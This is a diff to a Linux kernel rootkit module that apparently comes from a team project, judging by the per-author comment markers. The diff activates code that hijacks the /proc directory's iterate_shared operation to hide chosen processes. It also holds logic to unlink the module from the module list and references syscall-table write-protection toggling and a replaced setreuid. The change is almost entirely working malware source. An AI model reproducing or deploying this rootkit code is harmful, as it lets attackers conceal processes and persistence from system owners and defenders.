@@ -262,44 +262,44 @@ asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, uns
 // END BRIAN
 
 
-// //START CARLOS
-// //iterate takes pointer to dir_context	
-// struct list_head *module_list;//reference to module_list. Used to hide mod from insmod
-// int count;
-// static char* rkps[10];
-// module_param_array(rkps, charp, &count, 0);
-// static char *proc_to_hide = "1";
-// static char *proc_to_hide1 = "3538";
-// static struct file_operations proc_fops;//pointers to listing contents in proc dir
-// static struct file_operations *backup_proc_fops;//keep backup in order to restore orginal struct 
-// static struct inode *proc_inode;
-// static struct path p;
-// struct dir_context *backup_ctx;
+//START CARLOS
+//iterate takes pointer to dir_context	
+struct list_head *module_list;//reference to module_list. Used to hide mod from insmod
+int count;
+static char* rkps[10];
+module_param_array(rkps, charp, &count, 0);
+static char *proc_to_hide = "1";
+static char *proc_to_hide1 = "3538";
+static struct file_operations proc_fops;//pointers to listing contents in proc dir
+static struct file_operations *backup_proc_fops;//keep backup in order to restore orginal struct 
+static struct inode *proc_inode;
+static struct path p;
+struct dir_context *backup_ctx;
  
-// static int overwritten_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
-//     //prints contents 
-//     int i;
-//     for(i = 0; i< sizeof(rkps)/sizeof(rkps[0]); i++){
-// 	    if(rkps[i] != NULL) if (strncmp(proc_name, rkps[i], strlen(rkps[i])) == 0) return 0;
-//     }
-//     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);//return orginal pointer to  dir_context.Prints it off.
-// }
+static int overwritten_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
+    //prints contents 
+    int i;
+    for(i = 0; i< sizeof(rkps)/sizeof(rkps[0]); i++){
+	    if(rkps[i] != NULL) if (strncmp(proc_name, rkps[i], strlen(rkps[i])) == 0) return 0;
+    }
+    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);//return orginal pointer to  dir_context.Prints it off.
+}
 
-// struct dir_context hacked_ctx = {
-//     .actor = overwritten_filldir_t,//Evil struct
-// };
+struct dir_context hacked_ctx = {
+    .actor = overwritten_filldir_t,//Evil struct
+};
 
-// //getdents() calls iterate_dir() which calls iterate_shared()
-// int overwritten_iterate_shared(struct file *file, struct dir_context *ctx){
-//     printk(KERN_INFO "@$@!: rk_iterate_shared"); 
-//     int result = 0;
-//     hacked_ctx.pos = ctx->pos;
-//     backup_ctx = ctx;
-//     result = backup_proc_fops->iterate_shared(file, &hacked_ctx);
-//     ctx->pos = hacked_ctx.pos;
-//     return result;
-// }
-// //END  CARLOS  
+//getdents() calls iterate_dir() which calls iterate_shared()
+int overwritten_iterate_shared(struct file *file, struct dir_context *ctx){
+    printk(KERN_INFO "@$@!: rk_iterate_shared"); 
+    int result = 0;
+    hacked_ctx.pos = ctx->pos;
+    backup_ctx = ctx;
+    result = backup_proc_fops->iterate_shared(file, &hacked_ctx);
+    ctx->pos = hacked_ctx.pos;
+    return result;
+}
+//END  CARLOS  
 
 
 
@@ -353,21 +353,21 @@ static int __init rootkit_init(void){
 	printk(KERN_INFO "setreuid replaced\n");
 	// End Brendan
 
-// 	//Start Carlos
-// 	//module_list = THIS_MODULE->list.prev;//moves pointer
-//     	//list_del(&THIS_MODULE->list);//del the current pointer. Removes module from insmod.
-// 	printk(KERN_INFO "@$@?: The process is \"%s\" (pid %i)\n", current->comm, current->pid);
-// 	if(kern_path("/proc", 0, &p)){
-//         	printk(KERN_INFO "@%@?: System forced to exit becaus path for /proc not found");
-// 		return 0;
-// 	}
-// 	proc_inode = p.dentry->d_inode;/*get the inode*/
-//     	proc_fops = *proc_inode->i_fop;/* get a copy of file_oprartions from inode*/
-//    	backup_proc_fops = proc_inode->i_fop;/* back up file_operation*/
-//   	proc_fops.iterate_shared = overwritten_iterate_shared; /* modify copy without hijacked function */
-//    	proc_inode->i_fop = &proc_fops; /* overwrite the proc entry file operations */
-// 	printk(KERN_INFO "@$@?: Process in hiding");
-// 	//End Carlos
+	//Start Carlos
+	//module_list = THIS_MODULE->list.prev;//moves pointer
+    	//list_del(&THIS_MODULE->list);//del the current pointer. Removes module from insmod.
+	printk(KERN_INFO "@$@?: The process is \"%s\" (pid %i)\n", current->comm, current->pid);
+	if(kern_path("/proc", 0, &p)){
+        	printk(KERN_INFO "@%@?: System forced to exit becaus path for /proc not found");
+		return 0;
+	}
+	proc_inode = p.dentry->d_inode;/*get the inode*/
+    	proc_fops = *proc_inode->i_fop;/* get a copy of file_oprartions from inode*/
+   	backup_proc_fops = proc_inode->i_fop;/* back up file_operation*/
+  	proc_fops.iterate_shared = overwritten_iterate_shared; /* modify copy without hijacked function */
+   	proc_inode->i_fop = &proc_fops; /* overwrite the proc entry file operations */
+	printk(KERN_INFO "@$@?: Process in hiding");
+	//End Carlos
 		
 
 	write_cr0(read_cr0() | 0x10000); // This will make the sys call table read only again
